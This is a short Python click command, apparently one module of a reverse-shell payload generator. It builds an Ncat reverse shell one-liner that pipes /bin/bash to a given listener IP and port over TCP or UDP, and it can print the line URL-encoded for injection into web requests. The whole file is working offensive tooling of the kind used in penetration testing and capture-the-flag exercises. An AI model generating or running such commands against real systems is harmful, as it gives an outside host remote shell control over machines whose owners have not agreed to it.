import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("--udp", is_flag=True, default=False, help="Use UDP instead of TCP.")
def command(listener_ip, listener_port, raw, urlencode, udp):
    """Return Ncat reverse shell"""
    if udp:
        cmd = f"ncat --udp {listener_ip} {listener_port} -e /bin/bash"
        label = "Ncat UDP reverse shell"
    else:
        cmd = f"ncat {listener_ip} {listener_port} -e /bin/bash"
        label = "Ncat TCP reverse shell"
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}{label}:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
